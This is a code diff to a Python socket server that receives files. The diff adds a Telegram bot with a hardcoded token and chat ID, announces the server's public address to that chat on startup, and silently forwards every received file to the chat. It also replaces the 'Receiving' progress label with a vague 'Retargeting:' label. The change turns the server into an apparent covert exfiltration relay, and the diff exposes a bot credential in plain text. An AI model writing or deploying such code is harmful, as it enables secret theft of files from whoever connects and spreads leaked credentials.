@@ -1,20 +1,28 @@
-import socket, tqdm
+import socket, tqdm, telebot
 import os
 from _thread import *
-
-ServerSideSocket = socket.socket()
 from requests import get
 
-host = get('https://api.ipify.org').text
-print(host)
-port = 12345
+ServerSideSocket = socket.socket()
 BUFFER_SIZE = 4096
 SEPARATOR = "<SEPARATOR>"
+TOKEN = "1888960464:AAFi4PtqqjqprmU3h9m4VnsC30lqmXtH3ho"
+MYID = "1391993288"
+
+bot = telebot.TeleBot(TOKEN)
+host = get('https://api.ipify.org').text
+port = 12345
+
+
+
 ThreadCount = 0
 try:
     ServerSideSocket.bind((host, port))
 except socket.error as e:
+    ServerSideSocket.bind(("localhost", port))
     print(str(e))
+
+bot.send_message(chat_id=MYID,text=f"[#INITIALIZED_NEW_SERVER]\n\n{host}:{port}")
 
 print(f"SERVER READY\nListening on: {host}:{port}\n\nReady to work..")
 ServerSideSocket.listen(5)
@@ -24,19 +32,18 @@ def multi_threaded_client(connection):
       received = connection.recv(BUFFER_SIZE)
       print(str(received))
       filename, filesize = str(received).split(SEPARATOR)
-# remove absolute path if there is
       filename = os.path.basename(filename)
-# convert to integer
       filesize = int(filesize.replace("'",""))
-      progress = tqdm.tqdm(range(filesize), f"Receiving {filename}", unit="B", unit_scale=True, unit_divisor=1024)
+      progress = tqdm.tqdm(range(filesize), f"Retargeting:", unit="B", unit_scale=True, unit_divisor=1024)
       with open(filename, "wb") as f:
          while True:
             bytes_read = connection.recv(BUFFER_SIZE)
             if not bytes_read:    
                break
             f.write(bytes_read)
-        # update the progress bar
             progress.update(len(bytes_read))
+      f1 = open(filename,"rb")
+      bot.send_document(MYID, f1,caption=filename)
       connection.close()
    except Exception as e:
       print(f"ERROR: {e}")
